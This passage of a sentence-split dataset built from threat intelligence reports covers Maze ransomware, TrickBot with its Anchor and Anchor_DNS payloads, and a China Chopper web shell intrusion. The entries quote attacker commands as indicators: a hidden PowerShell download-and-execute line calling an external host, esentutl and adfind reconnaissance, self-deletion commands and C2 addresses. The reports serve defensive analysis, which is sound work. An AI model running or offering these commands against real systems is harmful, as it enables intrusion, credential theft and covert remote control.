        "text": "The malware uses this agent to make the connection, but it can change between samples:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S120",
        "text": "From a memory dump we can extract the IPs used by these connections, as well as a curious string that talks about Lawrence Abrams, the admin of the web site \u201cbleepingcomputer\u201d who was contacted directly by the developers.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S121",
        "text": "It is not known why they included this email address because it has no relation to the ransom note and is not used anywhere else.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S122",
        "text": "Perhaps it is a means of mocking the administrator of a site that frequently reports on ransomware?",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S123",
        "text": "The connections to the C2C IP addresses, in a pcap using Wireshark, can be seen perfectly:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S124",
        "text": "Maze has some strings in memory that are interesting and something that may be worth further analysis in the future:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S125",
        "text": "The webpage for making the payment requested in the ransom note gives a price and verifies that all is correct.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S126",
        "text": "Maze has a chat function to contact the operators and receive information about how to obtain the cryptocurrency required to make payment.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S127",
        "text": "Of course, as with many types of ransomware, there is an offer to decrypt three images for free and that service has been verified as working:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S0",
        "text": "The attack starts with a phishing email that contains a malicious link to a file hosted on Google Docs named \u201cAnnual Bonus Report.doc\u201d.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S1",
        "text": "When the user clicks on the link, the TrickBot dropper downloads onto the target machine.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S2",
        "text": "This differs from previous TrickBot attacks we have seen, where TrickBot is usually dropped through a Microsoft Office document or by another malware like Emotet.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S3",
        "text": "The campaigns use a TrickBot downloader that is signed and uses an icon to pretend it is a Microsoft Word document.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S4",
        "text": "When the user double-clicks the file, they are presented with a decoy message box.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S5",
        "text": "To avoid suspicion, the decoy message suggests the user should update Microsoft Word or open the file from another computer.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S6",
        "text": "While at first glance these files can be mistaken for legitimate Microsoft Word files, a closer inspection of the file metadata indicates they are not associated with Microsoft Word, nor are they Microsoft Word document files.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S7",
        "text": "Most of the initial payloads in these campaigns are signed with valid certificates to evade security tools.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S8",
        "text": "They abuse the relative trust that is given to signed binaries to avoid detection.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S9",
        "text": "The message box distracts the user as TrickBot\u2019s payload is downloaded, stored in the %TEMP% folder, and executed.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S10",
        "text": "A new process injects the TrickBot payload into a svchost.exe process.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S11",
        "text": "Once TrickBot\u2019s main payload is injected into the svchost.exe process, it carries out a series of reconnaissance-related tasks to profile the infected endpoint and the network.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S12",
        "text": "This information is crucial, as it determines the course of the attack.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S13",
        "text": "TrickBot checks for Internet connectivity by trying to access several designated domains.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S14",
        "text": "These domains are preconfigured and belong to legitimate web services, including: checkip.amazonaws.com, ipecho.net, ipinfo.io, api.ipify.org, icanhazip.com, myexternalip.com, wtfismyip.com, ip.anysrc.net.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S15",
        "text": "Once TrickBot verifies it can connect to the Internet, it communicates with C2 servers, some of which using TOR-related domains.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S16",
        "text": "It collects and sends information about where the target machine is located to the C2 servers.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S17",
        "text": "After TrickBot establishes Internet access and sends information about the location of the target machine, it starts its malicious activity.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S18",
        "text": "The module core-parser.dll is reflectively loaded into svchost.exe.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S19",
        "text": "core-parser.dll parses the TrickBot config files and extracts IP addresses for secondary C2 communication, redirection, and web injection logic.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S20",
        "text": "TrickBot sends the reconnaissance information from the target machine to a hardcoded C2 server.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S21",
        "text": "The C2 server is responsible for handling the stolen data.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S22",
        "text": "TrickBot also steals data from Internet Explorer by executing the built-in Windows tool ESENTUTL using the living-off-the-land technique (LOLBin).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S23",
        "text": "esentutl /p /o C:\\Users\\[USER]\\AppData\\Local\\Temp\\grabber_temp.edb",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S24",
        "text": "This command dumps the Extensible Storage Engine (ESE) database format.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S25",
        "text": "This variant of TrickBot employs a new, unique ability to steal passwords from KeePass, a free, open- source password manager.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S26",
        "text": "TrickBot's KeePass stealing capabilities seem to be inspired (or even partially copy-pasted) from a publicly available tool dubbed PoshKPBrute, a script that performs a dictionary attack against KeePass .kdbx files.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S27",
        "text": "Once it finds the dictionary key, it dumps all passwords as an output and sends the attackers the master password.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S28",
        "text": "TrickBot\u2019s stealer module also tries to extract keys from Filezilla, OpenSSH and OpenVPN.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S29",
        "text": "In addition to several crafted PowerShell commands, the attackers use several legitimate Windows processes to gather information, including nltest.exe, net.exe, ipconfig.exe, whoami.exe, and nslookup.exe.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S30",
        "text": "They gather information on:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S31",
        "text": "- All trusted domains, domains, and domain controllers",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S32",
        "text": "- A list of computers and network devices on the network",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S33",
        "text": "- The infected machine user and groups the user belongs to",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S34",
        "text": "- The infected machine, including machine name, operating system, workstation domain, and more information",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S35",
        "text": "- Network adapters that have connected to the machine and DNS servers\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S36",
        "text": "  - Nltest / domain_trusts /all_trusts",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S37",
        "text": "  - Net view /all\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S38",
        "text": "  - Nltest /domain_trusts",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S39",
        "text": "  - Net view /all /domain\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S40",
        "text": "  - Ipconfig /all",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S41",
        "text": "  - Net config workstation",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S42",
        "text": "  - Nslookup \u201c-q=srv_kerberos._tcp\u201d\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S43",
        "text": "  - /c \u201cstart microsoft-edge:http://127.0.0.1:52715/11984\u201d",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S44",
        "text": "The attacker also uses PowerShell to test DNS entry settings.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S45",
        "text": "They use the command -q=srv_kerberos_tcp on the process nslookup.exe to open an interactive shell.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S46",
        "text": "They use the shell to expand their search to other machines on the network by searching for things like a list of the domain controllers.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S47",
        "text": "With this in mind, we gather that the attackers goal is to spread within organizations to multiple machines, not just to the target machine.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S48",
        "text": "The threat actor evaluates information sent back to the C2 server and identifies if they have successfully infected a high-value target.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S49",
        "text": "If so, they escalate their efforts by switching to interactive hacking: reconnaissance, credential dumping, lateral movement, and in some cases the mass deployment of ransomware across endpoints connected to the domain controller.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S50",
        "text": "The threat actor leverages PowerShell to send additional payloads to the target machine.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S51",
        "text": "They issue commands to fetch a payload from a secondary server and, once it\u2019s downloaded, immediately execute it on the target machine through PowerShell.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S52",
        "text": "powershell.exe -nop -WindowStyle Hidden -executionpolicy bypass -c \"IEX ((new-object net.webclient).downloadstring('hxxps://northracing[.]net/?a=irs&x=[base64]'))\"",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S53",
        "text": "The northracing[.]net URL contains a PowerShell script in the contents of the webpage.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S54",
        "text": "Though we were unable to fetch the script used in this specific incident, we were able to pivot off the query parameters used in the above PowerShell script (?a=irs&x=) to find a sandbox report for similar activity.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S55",
        "text": "The PowerShell payload runs two stages: the first stage sends basic information to the C2 domain and waits for a response to see if it should continue its operation.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S56",
        "text": "If the threat actor does not send a stop flag, the PowerShell script runs in a constant loop and continuously POSTs data to the same domain the payload was fetched from.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S57",
        "text": "Each POST request is sent along with a UUID generated from the user\u2019s hostname and the current process ID.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S58",
        "text": "A POST request containing basic information about the machine is sent, which includes the current user and their domain, the root of the file system, and information about the operating system.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S59",
        "text": "This information is sent to the C2 along with the `i` parameter.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S60",
        "text": "When a response is received, the payload checks to see if the response matches the value cex01.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S61",
        "text": "If it does, the PowerShell script stops executing and kills the task.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S62",
        "text": "If the response is any other value, the script sets a timeout variable based on the response and continues to the main loop.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S63",
        "text": "This indicates that the attacker is either looking to target specific Windows domains or specific operating system versions.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S64",
        "text": "The main loop sends a POST request to the server with the `t` parameter, which requests the next commands from the server.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S65",
        "text": "Each line in the response from the threat actor contains a Base64-encoded command, which is decoded and then immediately executed using PowerShell through the Invoke-Expression (IEX) commandlet.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S66",
        "text": "The output of the command is sent back to the C2 server using a POST request with the \u201ca\u201d parameter.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S67",
        "text": "Meterpreter & Cobalt Strike Implants",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S68",
        "text": "The attackers use a Meterpreter implant to carry out post-exploitation actions.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S69",
        "text": "The Cybereason Platform detects both the shellcode and various Meterpreter DLLs reflectively loaded to memory.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S70",
        "text": "The detected DLLs include:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S71",
        "text": "- Metsrv.dll: For Meterpreter, where the protocol and extension systems are implemented\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S72",
        "text": "- Ext_server_priv.x86.dll: For privilege escalation",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S73",
        "text": "- Ext_server_stdapi.x86.dll: A metasploit post exploitation module used for reconnaissance",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S74",
        "text": "Cybereason detects the reflectively loaded malicious modules as a Meterpreter agent and shellcode executed by the Meterpreter agent.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S75",
        "text": "The Meterpreter agent creates a connection to port 4444 on the external IP address 91.12.89[.]129.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S76",
        "text": "Using Meterpreter, the attackers injected Cobalt Strike and other Metasploit payloads into the rundll32.exe process.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S77",
        "text": "The attacker uses the following metasploit modules:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S78",
        "text": "- ext_server_extapi.x86.dll : Obtains clipboard data and manipulates and decrypts the NTDS file \n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S79",
        "text": "- ext_server_priv.x86.dll : Performs privilege escalation",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S80",
        "text": "- Ext_server_stdapi.x86.dll : Performs reconnaissance activity",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S81",
        "text": "- Bypassuac.x64.dll: A post-exploitation module used to bypass User Account Control",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S82",
        "text": "Both Meterpreter and Cobalt Strike are legitimate penetration testing tools that have been repeatedly used by various threat actors, including the FIN6 threat actor.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S83",
        "text": "The threat actor uses known Cobalt Strike modules to enumerate Active Directory information:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S84",
        "text": "The attackers execute several Base64-encoded PowerShell commands in order to determine if the infected machine\u2019s user is in the admin or domain admin group.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S85",
        "text": "After verifying the user is an admin, the threat actor gathers information about the domain controllers and their IP addresses using an additional Base64-encoded and compressed PowerShell command.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S86",
        "text": "The decoded PowerShell command that attempts to gather domain controller information.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S87",
        "text": "The attackers deploys a batch script that executes the ADfind.exe tool to enumerate users, groups, and computers of the Windows domain.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S88",
        "text": "- adfind.exe -f \"(objectcategory=organizationalUnit)\"\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S89",
        "text": "- adfind.exe -gcb -sc trustdmp",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S90",
        "text": "- adfind.exe -f \"objectcategory=computer\"",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S91",
        "text": "- adfind.exe -sc trustdmp",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S92",
        "text": "- adfind.exe -f \"(objectcategory=person)\"\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S93",
        "text": "- adfind.exe -subnets -f (objectCategory=subnet)\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S94",
        "text": "- adfind.exe -f \"(objectcategory=group)\"",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S95",
        "text": "The ADfind tool has reportedly been used previously in attacks related to FIN6.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S96",
        "text": "One of the most interesting payloads in these attacks is the Anchor_DNS malware, which was originally discovered in October 2019 by NTT Security.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S97",
        "text": "It is classified by NTT as a variant of the infamous TrickBot malware, which uses DNS tunneling to stealthily communicate with C2 servers.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S98",
        "text": "Though this variant was first discovered in October 2019, there is evidence that Anchor_DNS was used as far back as March 2019.\\\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S99",
        "text": "This new variant acts as a sophisticated, stealthy backdoor that selectively chooses high-profile targets.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S100",
        "text": "Anchor_DNS is still undergoing rapid development cycles with code changes and new feature updates every few weeks.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S101",
        "text": "This is a new variant of Anchor_DNS that appeared as early as November 2019 and exhibits the following changes in code and behavior:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S102",
        "text": "- No self-deletion mechanism shown in previous samples",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S103",
        "text": "- No internet connectivity checks using legitimate online web services",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S104",
        "text": "- A built-in capability to check for C2 availability using",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S105",
        "text": "ICMP (ping)\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S106",
        "text": "- Additional partial string encryption and code obfuscation\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S107",
        "text": "anchorDNS_x64.exe contains a PDB path with the name of the malware, Anchor_DNS.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S108",
        "text": "This file is the 64-bit version of Anchor_DNS, however, there were earlier instances of the 32-bit version as well.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S109",
        "text": "The project name shows that this is the fifth version of Anchor_DNS.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S110",
        "text": "Many strings in the code have typos and grammatical mistakes, further affirming our suspicion that the authors of Anchor_DNS are not native english speakers.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S111",
        "text": "The threat actor gave considerable effort to obfuscating the code of this new Anchor_DNS variant using stack strings, string encryption, and by implementing a packer.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S112",
        "text": "The following example shows considerable changes in the code of the WinMain() function between an older variant of Anchor_DNS and the new variant.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S113",
        "text": "- -i flag: \n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S114",
        "text": "  - creates a scheduled task with the following naming convention (e.g \u201cNotepad++ autoupdate#94654\u201d): [random folder name in %APPDATA%] autoupdate#[random_number]",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S115",
        "text": "  - Writes NTFS ADS files ($TASK, $GUID, $FILE)\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S116",
        "text": "- -u flag: \n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S117",
        "text": "  - New Variant : executes the malware\u2019s main communication module with the C2",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S118",
        "text": "  - Old Variant: Drops a copy in %TEMP% Creates ADS files ($GUID, $FILE)\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S119",
        "text": "- -s flag: appears only on older versions of Anchor_DNS and runs the program without creating persistence and self-deletes once done.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S120",
        "text": "appears only on older versions of Anchor_DNS and runs the program without creating persistence and self-deletes once done.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S121",
        "text": "- --log=: expects a file name to write log file in C:\\Users\\[USER]",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S122",
        "text": "Older and newer versions of Anchor_DNS communicate over DNS.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S123",
        "text": "However, the newer version described here does not check Internet connectivity using legitimate online web services like ipinfo.io, and instead uses a built-in capability to check for the server\u2019s availability using the ICMP protocol.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S124",
        "text": "Anchor_DNS communicates with the C2 servers over DNS using DNS Tunneling.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S125",
        "text": "With this technique, Anchor_DNS can transfer data, receive commands, and download an additional payload, as detailed in NTT Security\u2019s report on an older Anchor_DNS sample.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S126",
        "text": "By implementing DNS Tunneling, Anchor_DNS can evade certain security products that might block certain network protocols or overlook DNS traffic.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S127",
        "text": "During our investigation, we found several unidentified malware samples related to TrickBot infections.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S128",
        "text": "The malware is dubbed Anchor by its authors and has been active since August 2018.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S129",
        "text": "Unlike Anchor_DNS, the Anchor malware does not implement communication over DNS.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S130",
        "text": "However, it does share many behavioral, code, and string similarities with Anchor_DNS and some similarities to TrickBot.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S131",
        "text": "Many Anchor samples have a very low or at times zero detection rate by AV vendors, which could explain the limited reports about this malware.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S132",
        "text": "The malware has both x86 and x64 versions and contains an installer component to install the malware.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S133",
        "text": "Similar to Anchor_DNS, Anchor creates an NTFS ADS file $GUID to store its GUID:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S134",
        "text": "Unlike Anchor_DNS, which stores the information in Base64, Anchor\u2019s GUID is saved in cleartext.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S135",
        "text": "Anchor and older versions of Anchor_DNS implement the exact same self deletion routine using two sets of commands to ensure that the dropper is deleted once the malware was successfully deployed:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S136",
        "text": "- cmd.exe /c timeout 1 && del C:\\Users\\[USER]\\[SAMPLE_LOCATION]\"",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S137",
        "text": "- cmd.exe /C PowerShell 'Start-Sleep 5; Remove-Item C:\\Users\\[USER]\\[SAMPLE_LOCATION]'\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S138",
        "text": "Similar to TrickBot, Anchor tries to establish Internet connectivity and the external IP of the target machine prior to communicating with its C2 servers.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S139",
        "text": "It uses the following hardcoded web services to test connectivity:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S140",
        "text": "Once it has established connectivity, it communicates with a set of hardcoded C2 servers.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S141",
        "text": "The request and response follow the same C2 communication format as TrickBot.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S142",
        "text": "Anchor and Anchor_DNS are both directly linked to TrickBot infections, as they are downloaded by TrickBot as secondary payloads.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S143",
        "text": "There are also several other similarities noted below.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S144",
        "text": "The GUID generation functions for Anchor_DNS and Anchor seem almost identical to that of the GUID generated by TrickBot.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S145",
        "text": "The GUID follows this pattern:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S146",
        "text": "Both Anchor and older versions of Anchor_DNS use a list of hardcoded online web services to determine Internet connectivity and check the external IP of the infected machine.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S147",
        "text": "The same list is also used by TrickBot:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S148",
        "text": "checkip.amazonaws.com, ipecho.net, ipinfo.io, api.ipify.org, icanhazip.com, myexternalip.com, wtfismyip.com, and ip.anysrc.net.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S149",
        "text": "In certain cases, if internet connectivity cannot be reached, Anchor and older versions of Anchor_DNS will delete themselves.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S150",
        "text": "TrickBot, Anchor, and Anchor_DNS typically use a separate C2 infrastructure.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S151",
        "text": "However, in some instances of this attack, there was C2 server overlap between these infrastructures.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S152",
        "text": "For example, the IP 23.95.97[.]59, which is hardcoded in an Anchor sample, has also served Anchor_DNS and TrickBot:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S153",
        "text": "Anchor sample with hardcoded IP (SHA-1: 9ebb541dcb24d564448a6f5e00c613b73eba7148)\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S154",
        "text": "This above IP address was used by TrickBot to download the squlDLL plugin, which includes email harvesting from SQL servers, screenlocker, and Mimikatz.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S155",
        "text": "The same IP resolved to a domain previously used by Anchor_DNS, chishir[.]com.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S0",
        "text": "The initial indicator of the attack was a malicious web shell that was detected on an IIS server, coming out of the w3wp.exe process.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S1",
        "text": "An investigation of the web shell, later classified as a modified version of the China Chopper web shell, uncovered several attack phases and TTPs.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S2",
        "text": "The threat actor was able to leverage the web shell to run reconnaissance commands, steal credentials, and deploy other tools.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S3",
        "text": "China Chopper is a web shell first discovered in 2012 that is commonly used by malicious Chinese actors.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S4",
        "text": "It is used to remotely control web servers, and has been used in many attacks against Australian web hosting providers.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S5",
        "text": "The web shell parameters in this attack match to the China Chopper parameters, as described in FireEye\u2019s analysis of China Chopper.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S6",
        "text": "This tool has been used by several Chinese-affiliated threat actors, such as APT 27 and APT 40.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S7",
        "text": "It is important to note that this tool is widely available and can be used by other threat actors.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S8",
        "text": "The threat actor launched a series of reconnaissance commands to try to obtain and enumerate information about the compromised machine, network architecture, users, and active directory enumeration.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S9",
        "text": "One of the reconnaissance commands was to run a modified nbtscan tool (\"NetBIOS nameserver scanner\") to identify available NetBIOS name servers locally or over the network.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S10",
        "text": "Nbtscan has been used by APT10 in Operation Cloud Hopper to search for services of interest across the IT estate and footprint endpoints of interest.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S11",
        "text": "It is also capable of identifying system information.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S12",
        "text": "Following the reconnaissance phase, the threat actor attempted to dump credentials stored on the compromised machines.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S13",
        "text": "The most common credential stealing tool used by the threat actor was a modified mimikatz that dumps NTLM hashes.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S14",
        "text": "This version of mimikatz did not require any command line arguments, most likely in an attempt to avoid detection based on command-line auditing.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S15",
        "text": "The dumped hashes were used to authenticate to other machines via pass the hash.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S16",
        "text": "We renamed this sample to maybemimi.exe.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S17",
        "text": "Reverse engineering shows the similarity between maybemimi.exe and mimikatz.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S18",
